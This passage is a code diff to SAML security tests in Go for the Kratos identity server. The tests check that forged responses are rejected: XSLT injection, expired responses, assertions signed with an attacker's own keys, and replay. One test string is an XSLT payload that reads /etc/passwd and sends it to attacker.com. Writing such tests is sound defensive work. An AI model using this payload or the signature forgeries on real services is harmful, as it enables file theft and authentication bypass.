-	xslt := "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"doc\"><xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/><xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/><xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/><xsl:variable name=\"exploitUrl\" select=\"concat($attackerUrl,$escaped)\"/><xsl:value-of select=\"unparsed-text($exploitUrl)\"/></xsl:template></xsl:stylesheet>"
+	xslt := "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"doc\"><xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/><xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/><xsl:variable name=\"attackerUrl\" select=\"'https://attacker.com/'\"/><xsl:variable name=\"exploitUrl\" select=\"concat($attackerUrl,$escaped)\"/><xsl:value-of select=\"unparsed-text($exploitUrl)\"/></xsl:template></xsl:stylesheet>"
 	xsltDoc := etree.NewDocument()
-	xsltDoc.ReadFromString(xslt)
+	err := xsltDoc.ReadFromString(xslt)
+	require.NoError(t, err)
 	xsltElement := xsltDoc.SelectElement("stylesheet")
 	doc.FindElement("//Transforms").AddChild(xsltElement)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -1114,7 +1050,7 @@ func TestExtensibleStylesheetLanguageTransformation(t *testing.T) {
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestExpiredSAMLResponse(t *testing.T) {
@@ -1129,13 +1065,13 @@ func TestExpiredSAMLResponse(t *testing.T) {
 	doc := etree.NewDocument()
 	doc.SetRoot(responseEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
-	// The answer was forged on January 1 and therefore we set the current date to January 2 so that it is expired
+	// The answer was forged on January 1, and therefore we set the current date to January 2 so that it is expired
 	TimeNow = func() time.Time {
 		rv, _ := time.Parse("Mon Jan 2 15:04:05.999999999 MST 2006", "Wed Jan 2 01:57:09.123456789 UTC 2014")
 		return rv
@@ -1146,16 +1082,13 @@ func TestExpiredSAMLResponse(t *testing.T) {
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
 
-	// Start the continuity
-	startContinuity(resp, req, strategy)
-
 	// We make sure that continuity is respected
 	ps := initRouterParams()
 
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestSignSAMLAssertionWithOwnKeypair(t *testing.T) {
@@ -1170,7 +1103,7 @@ func TestSignSAMLAssertionWithOwnKeypair(t *testing.T) {
 	doc := etree.NewDocument()
 	doc.SetRoot(responseEl)
 
-	// Get and Decrypt SAML Assertion in order to encrypt it afterwards
+	// Get and Decrypt SAML Assertion in order to encrypt it afterward
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)
 
 	// Sign the SAML assertion with an evil key pair
@@ -1180,24 +1113,22 @@ func TestSignSAMLAssertionWithOwnKeypair(t *testing.T) {
 
 	signingContext := dsig.NewDefaultSigningContext(keyStore)
 	signingContext.Canonicalizer = dsig.MakeC14N10ExclusiveCanonicalizerWithPrefixList("")
-	signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)
+	err = signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)
+	require.NoError(t, err)
 
 	signedAssertionEl, err := signingContext.SignEnveloped(decryptedAssertion)
 
-	// Replace the SAML crypted Assertion in the SAML Response by the assertion signed by our keys
+	// Replace the SAML encrypted Assertion in the SAML Response by the assertion signed by our keys
 	ReplaceResponseAssertion(t, responseEl, signedAssertionEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -1205,7 +1136,7 @@ func TestSignSAMLAssertionWithOwnKeypair(t *testing.T) {
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestSignSAMLResponseWithOwnKeypair(t *testing.T) {
@@ -1226,23 +1157,21 @@ func TestSignSAMLResponseWithOwnKeypair(t *testing.T) {
 
 	signingContext := dsig.NewDefaultSigningContext(keyStore)
 	signingContext.Canonicalizer = dsig.MakeC14N10ExclusiveCanonicalizerWithPrefixList("")
-	signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)
+	err = signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)
+	require.NoError(t, err)
 
 	// Sign the whole response
 	signedResponseEl, err := signingContext.SignEnveloped(responseEl)
 	doc.SetRoot(signedResponseEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -1250,7 +1179,7 @@ func TestSignSAMLResponseWithOwnKeypair(t *testing.T) {
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 func TestSignBothResponseAndAssertionWithOwnKeypair(t *testing.T) {
@@ -1265,7 +1194,7 @@ func TestSignBothResponseAndAssertionWithOwnKeypair(t *testing.T) {
 	doc := etree.NewDocument()
 	doc.SetRoot(responseEl)
 
-	// Get and Decrypt SAML Assertion in order to encrypt it afterwards
+	// Get and Decrypt SAML Assertion in order to encrypt it afterward
 	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)
 
 	// Sign the SAML assertion with an evil key pair
@@ -1275,28 +1204,26 @@ func TestSignBothResponseAndAssertionWithOwnKeypair(t *testing.T) {
 
 	signingContext := dsig.NewDefaultSigningContext(keyStore)
 	signingContext.Canonicalizer = dsig.MakeC14N10ExclusiveCanonicalizerWithPrefixList("")
-	signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)
+	err = signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)
+	require.NoError(t, err)
 
 	signedAssertionEl, err := signingContext.SignEnveloped(decryptedAssertion)
 
-	// Replace the SAML crypted Assertion in the SAML Response by the assertion signed by our keys
+	// Replace the SAML encrypted Assertion in the SAML Response by the assertion signed by our keys
 	ReplaceResponseAssertion(t, responseEl, signedAssertionEl)
 
 	// Sign the whole response with own keys pairs
 	signedResponseEl, err := signingContext.SignEnveloped(responseEl)
 	doc.SetRoot(signedResponseEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 
 	// Send the SAML Response to the SP ACS
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
@@ -1304,7 +1231,7 @@ func TestSignBothResponseAndAssertionWithOwnKeypair(t *testing.T) {
 	// We send the request to Kratos
 	strategy.HandleCallback(resp, req, ps)
 
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
 
 // Check if it is possible to send the same SAML Response twice (Replay Attack)
@@ -1320,24 +1247,21 @@ func TestReplayAttack(t *testing.T) {
 	doc := etree.NewDocument()
 	doc.SetRoot(responseEl)
 
-	// Get Reponse string
+	// Get Response string
 	responseStr, err := doc.WriteToString()
 	assert.NilError(t, err)
 
-	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
+	req := PrepareTestSAMLResponseHTTPRequest(t, strategy, testMiddleware, authnRequest, authnRequestID, responseStr)
 	resp := httptest.NewRecorder()
-
-	// Start the continuity
-	startContinuity(resp, req, strategy)
 
 	// We make sure that continuity is respected
 	ps := initRouterParams()
 
 	// We send the request once to Kratos, everything is in order so there should be no error.
 	strategy.HandleCallback(resp, req, ps)
-	assert.Check(t, !strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, !strings.Contains(resp.Header()["Location"][0], "error"))
 
 	// We send the same request a second time to Kratos, it has already been received by Kratos so there must be an error
 	strategy.HandleCallback(resp, req, ps)
-	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
+	assert.Check(t, strings.Contains(resp.Header()["Location"][0], "error"))
 }
